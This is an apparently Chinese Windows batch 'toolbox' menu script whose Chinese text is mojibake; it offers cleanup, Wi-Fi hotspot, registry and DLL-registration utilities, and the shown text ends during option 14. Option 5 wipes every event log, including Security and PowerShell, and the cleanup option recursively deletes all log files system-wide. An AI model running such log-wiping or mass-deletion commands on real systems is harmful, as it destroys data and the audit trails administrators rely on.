@echo off


:mark0
color f2
MODE con: COLS=75 LINES=25
cls

Setlocal enabledelayedexpansion
title �������߰�  !date:~5,2!��!date:~8,2!�� !time:~0,2!ʱ!time:~3,2!��!time:~6,2!��

echo.
echo.                     �������߰�  1.6.0        
echo.===============================================================
echo.   1  ����ϵͳ                        19 �쿴ϵͳ��Ϣ
echo.   2  ����wifi�ȵ�                    20 C�̷���
echo.   3  ȥ����ݷ�ʽС��ͷ              21 �쿴�û��б�
echo.   4  �ָ���ݷ�ʽС��ͷ              22 ��ʾ������ʣ��ռ����
echo.   5  ��յ�����־                    23 win�����޸�
echo.   6  ���ͼ�껺��                    24 �ļ���������
echo.   7  ����ע��IE���ȫ�����ӿ��ļ�    25 �ļ�ǿ��ɾ��
echo.   8  ע��ϵͳ����DLL                 26 ��Ӹ����Ҽ��˵�
echo.   9  flash�ؼ��޷�ע��               27 ��������
echo.   10 ����Ҽ���ȡ����ԱȨ��          28 �����ļ���jpg
echo.   11 �ָ�С����ͼ�궪ʧ
echo.   12 ȥ��ͼ��Ķ���
echo.   13 ��ʾ�Լ���IP 
echo.   14 ���������Ҽ��˵�ѡ��
echo.   15 ��������������Ŀ 
echo.   16 ɾ��Ĭ�Ϲ���
echo.   17 ľ��˿ڷ�ɱ
echo.   18 ��ʱ�ػ�                      
echo.                                     255 ��������
echo.                   A:about(����)    E:exit(�˳�)               
echo.===============================================================
echo.��ѡ���Ӧ����Ŀ ��enter��ȷ��:
set /p choice=



if /i "%choice%"=="1" goto mark1
if /i "%choice%"=="2" goto mark2
if /i "%choice%"=="3" goto Permission_Test
if /i "%choice%"=="4" goto Permission_Test
if /i "%choice%"=="5" goto Permission_Test
if /i "%choice%"=="6" goto Permission_Test
if /i "%choice%"=="7" goto mark7
if /i "%choice%"=="8" goto mark8
if /i "%choice%"=="9" goto mark9
if /i "%choice%"=="10" goto Permission_Test
if /i "%choice%"=="11" goto mark11
if /i "%choice%"=="12" goto Permission_Test
if /i "%choice%"=="13" goto mark13
if /i "%choice%"=="14" goto mark14
if /i "%choice%"=="15" goto mark15
if /i "%choice%"=="16" goto mark16
if /i "%choice%"=="17" goto mark17
if /i "%choice%"=="18" goto mark18
if /i "%choice%"=="19" goto mark19
if /i "%choice%"=="20" goto mark20
if /i "%choice%"=="21" goto mark21
if /i "%choice%"=="22" goto mark22
if /i "%choice%"=="23" goto mark23
if /i "%choice%"=="24" goto mark24
if /i "%choice%"=="25" goto mark25
if /i "%choice%"=="26" goto Permission_Test
if /i "%choice%"=="27" goto Permission_Test
if /i "%choice%"=="28" goto mark28
if /i "%choice%"=="255" goto mark255 
if /i "%choice%"=="E" goto markE
if /i "%choice%"=="A" goto markA

exit                    ::��ֹ�����ּ�����
:Permission_Test

Title Ȩ��ȷ��!!
del /f /q %SystemRoot%\System32\Ȩ�޲���.dat >nul 2>nul
if exist %SystemRoot%\System32\Ȩ�޲���.dat (
    cls
    echo.����������������~
    echo.��������������������~
    pause>nul
    exit
)
cls
echo;
echo;
echo;
echo                ���ڲ��������Ȩ��
echo;
echo                   ...���Ժ�...
echo;>%SystemRoot%\System32\Ȩ�޲���.dat
if not exist %SystemRoot%\System32\Ȩ�޲���.dat (
cls
mode con cols=40 lines=6
color fc 
    echo.             Ȩ���쳣��~
    echo.	  ���ֹ�����ҪȨ����~
    echo.       ����Թ���ԱȨ��������~
    echo.Ҳ���԰������ҪȨ����֤�Ĵ���ɾ����~
    echo.             ������˳���~
    pause>nul
    exit
)
del /f /q %SystemRoot%\System32\Ȩ�޲���.dat >nul 2>nul

(
if /i "%choice%"=="3" goto mark3
if /i "%choice%"=="4" goto mark4
if /i "%choice%"=="5" goto mark5
if /i "%choice%"=="6" goto mark6
if /i "%choice%"=="10" goto mark10
if /i "%choice%"=="12" goto mark12
if /i "%choice%"=="26" goto mark26
if /i "%choice%"=="27" goto mark27
)

exit                    ::��ֹ�����ּ�����
:markA

cls
@echo off&setlocal enabledelayedexpansion&title about(����)
mode con cols=34 lines=9
set a=�����������
set b=��
set c=
set d=
set e=123456789abcde
echo/
echo **********(A-B-O-U-T)***********
echo.
echo. ����ѡ����Ҫ����Ա���������~
echo. ����win7�ϲ��Թ��ı�С������~
echo. ������������ȫ�����Ի�������~
echo. �����Ǳ���ԭ������~		
echo. ���������@�ٶ�ID"��ѩ����"��~
echo.

@echo msgbox "About:��ѩ��������">msg.vbs 
@msg.vbs
@del msg.vbs

:about-1
for /l %%a in (0,1,9) do (
set /a f=%random%%%14+1
set/p=!a:~%%a,1!<nul&set/p=%b%<nul
ping -n 1 127.1>nul
color 0!e:~%f%,1!
set/p=%c%<nul
if %%a equ 9 (set/p=%d%<nul&for /l %%a in (9,-1,1) do (set/p=!a:~-%%a!!<nul&set/p=%b%<nul&ping -n 1 127.1>nul&set/p=%d%<nul))
)
goto about-1



:markE
exit



:mark1
cls
tltle ����ϵͳ
@echo off

@echo off 
color 0b
echo ==================================================================
echo.
echo �������� WIN 7 ϵͳ�������� ���������е�����ܰ�ȫ��
echo.
echo ==================================================================
echo.
echo �ڳ���û�н�������Ϣʱ������رձ����ڣ�
echo.
echo ==================================================================
echo.
echo �������ϵͳ�����ļ������Ժ�...... 
echo.
echo ==================================================================
echo.
echo **********************************
echo.
echo �� һ
echo ɾ����ʱ�ļ�
echo.
echo **********************************
echo.
del /f /s /q %systemdrive%\*.tmp 
del /f /s /q %systemdrive%\*._mp 
rd /s /q %windir%\temp & md %windir%\temp
del /f /s /q "%userprofile%\local settings\temp\*.*" 
del /f /s /q %windir%\prefetch\*.* 
echo.
echo **********************************
echo.
echo �� ��
echo ɾ����־�ļ�
echo ɾ�����������ļ�
echo ɾ������ɨ�����µ���ʱ�ļ�
echo ɾ�������ļ�
echo ɾ���ɱ����ļ�
echo.
echo **********************************
echo.
del /f /s /q %systemdrive%\*.log
del /f /s /q %systemdrive%\*.gid 
del /f /s /q %systemdrive%\*.chk 
del /f /s /q %windir%\*.bak 
del /f /s /q %systemdrive%\*.old 
echo.
echo **********************************
echo.
echo �� ��
echo ��ջ���վ
echo.
echo **********************************
echo.
del /f /s /q c:\$recycle.bin\*.*
del /f /s /q d:\$recycle.bin\*.*
del /f /s /q e:\$recycle.bin\*.*
del /f /s /q f:\$recycle.bin\*.*
del /f /s /q g:\$recycle.bin\*.*
echo.
echo **********************************
echo.
echo �� ��
echo ɾ���Զ����º����µ����

echo.
echo **********************************
echo.
rd /s /q %windir%\SoftwareDistribution\Download & md %windir%\SoftwareDistribution\Download
echo.
echo **********************************
echo.
echo �� ��
echo ɾ������������Cookies
echo.
echo **********************************
echo.
del /f /q ��%userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\*.*��
echo.
echo **********************************
echo.
echo �� ��
echo ɾ��������������ʱ�ļ�
echo.
echo **********************************
echo.
del /f /s /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
echo.
echo **********************************
echo.
echo �� ��
echo ����˽������
echo.
echo **********************************
echo.
del /f /s /q "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" 

echo ���ϵͳ������ɣ��밴�����������һ�㡭��
pause >nul
goto mark0


exit                    ::��ֹ�����ּ�����
:mark2
cls
title wifi����
@echo off

echo    1.����wifi
echo    2.��wifi
echo    3.��ʾ���ӿͻ���
echo    4.�ر�wifi
echo    5.�˳������˳����򽫲���Ӱ��wifiʹ�ã�
echo    6.������һ��
set /p k= ��ѡ���Ӧ����Ŀ ��enter��ȷ��:
if /i %k%==1 goto mark2.1
if /i %k%==2 goto mark2.2
if /i %k%==3 goto mark2.3
if /i %k%==4 goto mark2.4
if /i %k%==5 goto mark2.5
if /i %k%==6 goto mark0
echo ����������󣬰����������������
pause >nul
cls
goto mark2

:mark2.1
cls
set /p name=�������˺ţ�
cls
set /p secrect=���������루8��16���ַ�����
netsh wlan set hostednetwork mode=allow ssid=%name% key=%secrect%
echo.
pause >nul
cls
goto mark2

:mark2.2
netsh wlan start hostednetwork
cls
echo ����ʹ��wifi��
echo.
pause >nul
cls
goto mark2

:mark2.3
cls
netsh wlan show hostednetwork
pause >nul
cls
goto mark2

:mark2.4
netsh wlan stop hostednetwork
cls
echo �ѹر�wifi��
pause >nul
cls
goto mark2.4

:mark2.5
cls
echo.
echo.
echo.
echo            
ping /n 3 127.1>nul
exit
pause >nul
exit                    ::��ֹ�����ּ�����


:mark3
cls
title ȥ����ݷ�ʽС��ͷ
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /d "%systemroot%\system32\imageres.dll,196" /t reg_sz /f
taskkill /f /im explorer.exe
attrib -s -r -h "%userprofile%\AppData\Local\iconcache.db"
del "%userprofile%\AppData\Local\iconcache.db" /f /q
start explorer

echo. ȥ����ݷ�ʽС��ͷ��ɣ�
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����

:mark4
cls
title �ָ���ݷ�ʽС��ͷ
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f
taskkill /f /im explorer.exe
attrib -s -r -h "%userprofile%\AppData\Local\iconcache.db"
del "%userprofile%\AppData\Local\iconcache.db" /f /q
start explorer

echo. �ָ���ݷ�ʽС��ͷ��ɣ�
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����



:mark5
cls
echo. ��ʼ��յ�����־��
title ��յ�����־
wevtutil.exe cl "ACEEventLog"
wevtutil.exe cl "Application"
wevtutil.exe cl "HardwareEvents"
wevtutil.exe cl "Internet Explorer"
wevtutil.exe cl "Key Management Service"
wevtutil.exe cl "Media Center"
wevtutil.exe cl "Microsoft-Windows-API-Tracing/Operational"
wevtutil.exe cl "Microsoft-Windows-AppID/Operational"
wevtutil.exe cl "Microsoft-Windows-Application-Experience/Problem-Steps-Recorder"
wevtutil.exe cl "Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant"
wevtutil.exe cl "Microsoft-Windows-Application-Experience/Program-Compatibility-Troubleshooter"
wevtutil.exe cl "Microsoft-Windows-Application-Experience/Program-Inventory"
wevtutil.exe cl "Microsoft-Windows-Application-Experience/Program-Telemetry"
wevtutil.exe cl "Microsoft-Windows-AppLocker/EXE and DLL"
wevtutil.exe cl "Microsoft-Windows-AppLocker/MSI and Script"
wevtutil.exe cl "Microsoft-Windows-Audio/CaptureMonitor"
wevtutil.exe cl "Microsoft-Windows-Audio/Operational"
wevtutil.exe cl "Microsoft-Windows-Authentication User Interface/Operational"
wevtutil.exe cl "Microsoft-Windows-Backup"
wevtutil.exe cl "Microsoft-Windows-BitLocker-DrivePreparationTool/Admin"
wevtutil.exe cl "Microsoft-Windows-BitLocker-DrivePreparationTool/Operational"
wevtutil.exe cl "Microsoft-Windows-Bits-Client/Operational"
wevtutil.exe cl "Microsoft-Windows-Bluetooth-MTPEnum/Operational"
wevtutil.exe cl "Microsoft-Windows-BranchCache/Operational"
wevtutil.exe cl "Microsoft-Windows-BranchCacheSMB/Operational"
wevtutil.exe cl "Microsoft-Windows-CodeIntegrity/Operational"
wevtutil.exe cl "Microsoft-Windows-CorruptedFileRecovery-Client/Operational"
wevtutil.exe cl "Microsoft-Windows-CorruptedFileRecovery-Server/Operational"
wevtutil.exe cl "Microsoft-Windows-DateTimeControlPanel/Operational"
wevtutil.exe cl "Microsoft-Windows-DeviceSync/Operational"
wevtutil.exe cl "Microsoft-Windows-Dhcp-Client/Admin"
wevtutil.exe cl "Microsoft-Windows-DhcpNap/Admin"
wevtutil.exe cl "Microsoft-Windows-Dhcpv6-Client/Admin"
wevtutil.exe cl "Microsoft-Windows-Diagnosis-DPS/Operational"
wevtutil.exe cl "Microsoft-Windows-Diagnosis-PCW/Operational"
wevtutil.exe cl "Microsoft-Windows-Diagnosis-PLA/Operational"
wevtutil.exe cl "Microsoft-Windows-Diagnosis-Scheduled/Operational"
wevtutil.exe cl "Microsoft-Windows-Diagnosis-Scripted/Admin"
wevtutil.exe cl "Microsoft-Windows-Diagnosis-Scripted/Operational"
wevtutil.exe cl "Microsoft-Windows-Diagnosis-ScriptedDiagnosticsProvider/Operational"
wevtutil.exe cl "Microsoft-Windows-Diagnostics-Networking/Operational"
wevtutil.exe cl "Microsoft-Windows-Diagnostics-Performance/Operational"
wevtutil.exe cl "Microsoft-Windows-DiskDiagnostic/Operational"
wevtutil.exe cl "Microsoft-Windows-DiskDiagnosticDataCollector/Operational"
wevtutil.exe cl "Microsoft-Windows-DiskDiagnosticResolver/Operational"
wevtutil.exe cl "Microsoft-Windows-DriverFrameworks-UserMode/Operational"
wevtutil.exe cl "Microsoft-Windows-EapHost/Operational"
wevtutil.exe cl "Microsoft-Windows-EventCollector/Operational"
wevtutil.exe cl "Microsoft-Windows-Fault-Tolerant-Heap/Operational"
wevtutil.exe cl "Microsoft-Windows-FMS/Operational"
wevtutil.exe cl "Microsoft-Windows-Folder Redirection/Operational"
wevtutil.exe cl "Microsoft-Windows-Forwarding/Operational"
wevtutil.exe cl "Microsoft-Windows-GroupPolicy/Operational"
wevtutil.exe cl "Microsoft-Windows-Help/Operational"
wevtutil.exe cl "Microsoft-Windows-HomeGroup Control Panel/Operational"
wevtutil.exe cl "Microsoft-Windows-HomeGroup Listener Service/Operational"
wevtutil.exe cl "Microsoft-Windows-HomeGroup Provider Service/Operational"
wevtutil.exe cl "Microsoft-Windows-IKE/Operational"
wevtutil.exe cl "Microsoft-Windows-International/Operational"
wevtutil.exe cl "Microsoft-Windows-International-RegionalOptionsControlPanel/Operational"
wevtutil.exe cl "Microsoft-Windows-Iphlpsvc/Operational"
wevtutil.exe cl "Microsoft-Windows-Kernel-EventTracing/Admin"
wevtutil.exe cl "Microsoft-Windows-Kernel-Power/Thermal-Operational"
wevtutil.exe cl "Microsoft-Windows-Kernel-StoreMgr/Operational"
wevtutil.exe cl "Microsoft-Windows-Kernel-WDI/Operational"
wevtutil.exe cl "Microsoft-Windows-Kernel-WHEA/Errors"
wevtutil.exe cl "Microsoft-Windows-Kernel-WHEA/Operational"
wevtutil.exe cl "Microsoft-Windows-Known Folders API Service"
wevtutil.exe cl "Microsoft-Windows-LanguagePackSetup/Operational"
wevtutil.exe cl "Microsoft-Windows-MCT/Operational"
wevtutil.exe cl "Microsoft-Windows-MemoryDiagnostics-Results/Debug"
wevtutil.exe cl "Microsoft-Windows-MUI/Admin"
wevtutil.exe cl "Microsoft-Windows-MUI/Operational"
wevtutil.exe cl "Microsoft-Windows-NCSI/Operational"
wevtutil.exe cl "Microsoft-Windows-NetworkAccessProtection/Operational"
wevtutil.exe cl "Microsoft-Windows-NetworkAccessProtection/WHC"
wevtutil.exe cl "Microsoft-Windows-NetworkLocationWizard/Operational"
wevtutil.exe cl "Microsoft-Windows-NetworkProfile/Operational"
wevtutil.exe cl "Microsoft-Windows-NlaSvc/Operational"
wevtutil.exe cl "Microsoft-Windows-NTLM/Operational"
wevtutil.exe cl "Microsoft-Windows-OfflineFiles/Operational"
wevtutil.exe cl "Microsoft-Windows-ParentalControls/Operational"
wevtutil.exe cl "Microsoft-Windows-PeopleNearMe/Operational"
wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational"
wevtutil.exe cl "Microsoft-Windows-PrintService/Admin"
wevtutil.exe cl "Microsoft-Windows-ReadyBoost/Operational"
wevtutil.exe cl "Microsoft-Windows-ReadyBoostDriver/Operational"
wevtutil.exe cl "Microsoft-Windows-Recovery/Operational"
wevtutil.exe cl "Microsoft-Windows-ReliabilityAnalysisComponent/Operational"
wevtutil.exe cl "Microsoft-Windows-RemoteApp and Desktop Connections/Admin"
wevtutil.exe cl "Microsoft-Windows-RemoteAssistance/Admin"
wevtutil.exe cl "Microsoft-Windows-RemoteAssistance/Operational"
wevtutil.exe cl "Microsoft-Windows-Resource-Exhaustion-Detector/Operational"
wevtutil.exe cl "Microsoft-Windows-Resource-Exhaustion-Resolver/Operational"
wevtutil.exe cl "Microsoft-Windows-Resource-Leak-Diagnostic/Operational"
wevtutil.exe cl "Microsoft-Windows-RestartManager/Operational"
wevtutil.exe cl "Microsoft-Windows-Security-Audit-Configuration-Client/Operational"
wevtutil.exe cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Admin"
wevtutil.exe cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
wevtutil.exe cl "Microsoft-Windows-TerminalServices-PnPDevices/Admin"
wevtutil.exe cl "Microsoft-Windows-TerminalServices-PnPDevices/Operational"
wevtutil.exe cl "Microsoft-Windows-TerminalServices-RDPClient/Operational"
wevtutil.exe cl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin"
wevtutil.exe cl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational"
wevtutil.exe cl "Microsoft-Windows-TZUtil/Operational"
wevtutil.exe cl "Microsoft-Windows-UAC/Operational"
wevtutil.exe cl "Microsoft-Windows-UAC-FileVirtualization/Operational"
wevtutil.exe cl "Microsoft-Windows-User Profile Service/Operational"
wevtutil.exe cl "Microsoft-Windows-VDRVROOT/Operational"
wevtutil.exe cl "Microsoft-Windows-VHDMP/Operational"
wevtutil.exe cl "Microsoft-Windows-WER-Diag/Operational"
wevtutil.exe cl "Microsoft-Windows-WFP/Operational"
wevtutil.exe cl "Microsoft-Windows-Windows Defender/Operational"
wevtutil.exe cl "Microsoft-Windows-Windows Defender/WHC"
wevtutil.exe cl "Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurity"
wevtutil.exe cl "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"
wevtutil.exe cl "Microsoft-Windows-WindowsBackup/ActionCenter"
wevtutil.exe cl "Microsoft-Windows-WindowsSystemAssessmentTool/Operational"
wevtutil.exe cl "Microsoft-Windows-WindowsUpdateClient/Operational"
wevtutil.exe cl "Microsoft-Windows-Winlogon/Operational"
wevtutil.exe cl "Microsoft-Windows-WinRM/Operational"
wevtutil.exe cl "Microsoft-Windows-Winsock-WS2HELP/Operational"
wevtutil.exe cl "Microsoft-Windows-Wired-AutoConfig/Operational"
wevtutil.exe cl "Microsoft-Windows-WLAN-AutoConfig/Operational"
wevtutil.exe cl "Microsoft-Windows-WPD-ClassInstaller/Operational"
wevtutil.exe cl "Microsoft-Windows-WPD-CompositeClassDriver/Operational"
wevtutil.exe cl "Microsoft-Windows-WPD-MTPClassDriver/Operational"
wevtutil.exe cl "ODiag"
wevtutil.exe cl "OSession"
wevtutil.exe cl "Security"
wevtutil.exe cl "Setup"
wevtutil.exe cl "System"
wevtutil.exe cl "Windows PowerShell"


echo. ��յ�����־��ɣ�
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����





:mark6
cls
title ���ͼ�껺��
echo.   ��ʼ���ͼ�껺��
taskkill /f /im explorer.exe

rem ����ϵͳͼ�껺�����ݿ�

attrib -h -s -r "%userprofile%\AppData\Local\IconCache.db"

del /f "%userprofile%\AppData\Local\IconCache.db"

attrib /s /d -h -s -r "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\*"

del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_32.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_96.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_102.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_256.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_1024.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_idx.db"
del /f "%userprofile%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_sr.db"

rem ���� ϵͳ���̼����ͼ��

echo y|reg delete "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify" /v IconStreams
echo y|reg delete "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify" /v PastIconsStream

rem ����Windows��ǳ���explorer

start explorer


echo. ���ͼ�껺�����
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����










:mark7
cls
title ����ע��IE���ȫ�����ӿ��ļ�
echo.   ��ʼ����ע��IE���ȫ�����ӿ��ļ�
rundll32.exe advpack.dll /DelNodeRunDll32 C:\WINNTW\System32\dacui.dll

rundll32.exe advpack.dll /DelNodeRunDll32 C:\WINNTW\Catroot\icatalog.mdb 

regsvr32 setupwbv.dll /s 
regsvr32 wininet.dll /s
regsvr32 comcat.dll /s
regsvr32 shdoc401.dll /s
regsvr32 shdoc401.dll /i /s
regsvr32 asctrls.ocx /s
regsvr32 oleaut32.dll /s
regsvr32 shdocvw.dll /I /s
regsvr32 shdocvw.dll /s
regsvr32 browseui.dll /s
regsvr32 browseui.dll /I /s
regsvr32 msrating.dll /s
regsvr32 mlang.dll /s
regsvr32 hlink.dll /s
regsvr32 mshtmled.dll /s
regsvr32 urlmon.dll /s
regsvr32 plugin.ocx /s
regsvr32 sendmail.dll /s
regsvr32 comctl32.dll /i  /s
regsvr32 inetcpl.cpl /i  /s
regsvr32 mshtml.dll /i  /s
regsvr32 scrobj.dll /s
regsvr32 mmefxe.ocx /s
regsvr32 proctexe.ocx mshta.exe /register  /s
regsvr32 corpol.dll /s
regsvr32 jscript.dll /s
regsvr32 msxml.dll /s
regsvr32 imgutil.dll /s
regsvr32 thumbvw.dll /s
regsvr32 cryptext.dll /s
regsvr32 rsabase.dll /s
regsvr32 triedit.dll /s
regsvr32 dhtmled.ocx /s
regsvr32 inseng.dll /s
regsvr32 iesetup.dll /i /s
regsvr32 hmmapi.dll /s
regsvr32 cryptdlg.dll /s
regsvr32 actxprxy.dll /s
regsvr32 dispex.dll /s
regsvr32 occache.dll /s
regsvr32 occache.dll /i /s
regsvr32 iepeers.dll /s
regsvr32 wininet.dll /i /s
regsvr32 urlmon.dll /i /s
regsvr32 digest.dll /i /s
regsvr32 cdfview.dll /s
regsvr32 webcheck.dll /s
regsvr32 mobsync.dll /s
regsvr32 pngfilt.dll /s
regsvr32 licmgr10.dll /s
regsvr32 icmfilter.dll /s
regsvr32 hhctrl.ocx /s
regsvr32 inetcfg.dll /s
regsvr32 trialoc.dll /s
regsvr32 tdc.ocx /s
regsvr32 MSR2C.DLL /s
regsvr32 msident.dll /s
regsvr32 msieftp.dll /s
regsvr32 xmsconf.ocx /s
regsvr32 ils.dll /s
regsvr32 msoeacct.dll /s
regsvr32 wab32.dll /s
regsvr32 wabimp.dll /s
regsvr32 wabfind.dll /s
regsvr32 oemiglib.dll /s
regsvr32 directdb.dll /s
regsvr32 inetcomm.dll /s
regsvr32 msoe.dll /s
regsvr32 oeimport.dll /s
regsvr32 madxm.ocx /s
regsvr32 dxmasf.dll /s
regsvr32 laprxy.dll /s
regsvr32 l3codecx.ax /s
regsvr32 acelpdec.ax /s
regsvr32 mpg4ds32.ax /s
regsvr32 voxmsdec.ax /s
regsvr32 Daxctle.dll /s
regsvr32 lmrt.dll /s
regsvr32 datime.dll /s
regsvr32 dxtrans.dll /s
regsvr32 dxtmsft.dll /s
regsvr32 vgx.dll /s
regsvr32 WEBPOST.DLL /s
regsvr32 WPWIZDLL.DLL /s
regsvr32 POSTWPP.DLL /s
regsvr32 CRSWPP.DLL /s
regsvr32 FTPWPP.DLL /s
regsvr32 FPWPP.DLL /s
regsvr32 FLUPL.OCX /s
regsvr32 wshom.ocx /s
regsvr32 wshext.dll /s
regsvr32 vbscript.dll /s
regsvr32 scrrun.dll mstinit.exe /setup /s
regsvr32 msnsspc.dll /SspcCreateSspiReg /s
regsvr32 msapsspc.dll /SspcCreateSspiReg /s

echo. ����ע��IE���ȫ�����ӿ��ļ����
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����











:mark8
cls
title ע��ϵͳ����DLL
for /f %%i in ('dir /a /b %windir%\system32\*.dll') do echo ����ע��%%i,���Ժ�... & regsvr32 /s "%windir%\system32\%%i" & cls

echo. ����ע��ϵͳ����DLL
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����






:mark9 
cls
title ע��flash�ؼ�dll
regsvr32 Shdocvw.dll 
regsvr32 Oleaut32.dll 
regsvr32 Actxprxy.dll 
regsvr32 Mshtml.dll 
regsvr32 Urlmon.dll 
regsvr32 browseui.dll

echo. ����ע��flash�ؼ�dll
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����




:mark10
cls
title ����Ҽ���ȡ����ԱȨ��

reg add "HKCR\*\shell\runas" /f /ve /t REG_SZ /d "��ӹ���ԱȨ��"
reg add "HKCR\*\shell\runas" /f /v "NoWorkingDirectory" /t REG_SZ /d ""
reg add "HKCR\*\shell\runas\command" /f /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F"
reg add "HKCR\*\shell\runas\command" /f /v "IsolatedCommand" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F"
reg add "HKCR\exefile\shell\runas2" /f /ve /t REG_SZ /d "��ӹ���ԱȨ��"
reg add "HKCR\exefile\shell\runas2" /f /v "NoWorkingDirectory" /t REG_SZ /d ""
reg add "HKCR\exefile\shell\runas2\command" /f /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F"
reg add "HKCR\exefile\shell\runas2\command" /f /v "IsolatedCommand" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F"
reg add "HKCR\Directory\shell\runas" /f /ve /t REG_SZ /d "��ӹ���ԱȨ��"
reg add "HKCR\Directory\shell\runas" /f /v "NoWorkingDirectory" /t REG_SZ /d ""
reg add "HKCR\Directory\shell\runas\command" /f /ve /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" /r /d y && icacls \"%%1\" /grant administrators:F /t"
reg add "HKCR\Directory\shell\runas\command" /f /v "IsolatedCommand" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" /r /d y && icacls \"%%1\" /grant administrators:F /t"

echo. ����Ҽ���ȡ����ԱȨ�����
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����









:mark11
cls
title �ָ�С����ͼ��
echo. ��ʼ�ָ�С����ͼ��

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify" /f /v "PastIconsStream" 
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify" /f /v "IconStreams" 
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /f /v "NoSaveSettings" 
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /f /v "NoTrayItemsDisplay" 
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /f /v "NoSaveSettings" 
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /f /v "NoTrayItemsDisplay" 
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /f /v "SystemTray" /t REG_SZ /d "systray.exe"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad" /f /v "SysTray" /t REG_SZ /d "{35CEC8A3-2BE6-11D2-8773-92E220524153}"
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /f /v "DisableLocalUserRun" 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\upnphost" /f /v "Start" /t REG_DWORD /d 4
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SSDPSRV" /f /v "Start" /t REG_DWORD /d 4
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Nla" /f /v "Start" /t REG_DWORD /d 2
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netman" /f /v "Start" /t REG_DWORD /d 2

echo. �ָ�С����ͼ�����
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����






:mark12
cls
title ȥ��ͼ��Ķ���
echo. ȷ��uac�ر�  �����û��˻����ơ�
echo. ȷ��(1)   ������һ��(0)
set /p m=        ��ѡ���Ӧ����Ŀ ��enter��ȷ��:

if /i "%m%"=="1" goto mark12.1
if /i "%m%"=="0" goto mark0

:mark12.1

echo. ��ʼȥ��ͼ��Ķ���

taskkill /f /im explorer.exe
attrib -s -r -h "%userprofile%\AppData\Local\iconcache.db"
del "%userprofile%\AppData\Local\iconcache.db" /f /q
start explorer����

echo. ȥ��ͼ��Ķ������
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����






:mark13

cls
title ��ʾ�Լ���IP 

for /f "tokens=15" %%i in ('ipconfig ^| find /i "ip address"') do set ip=%%i
echo %ip%

echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����




:mark14

title ���������Ҽ��˵�ѡ��
cls
echo.���ֲ���������Լ�ȥ�ٶȰɡ�
pause

regsvr32 /u /s igfxpph.dll
reg delete HKEY_CLASSES_ROOT\Directory\Background\shellex\ContextMenuHandlers /f
reg add HKEY_CLASSES_ROOT\Directory\Background\shellex\ContextMenuHandlers\new /ve /d {D969A300-E7FF-11d0-A93B-00A0C90F2719}
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v HotKeysCmds /f
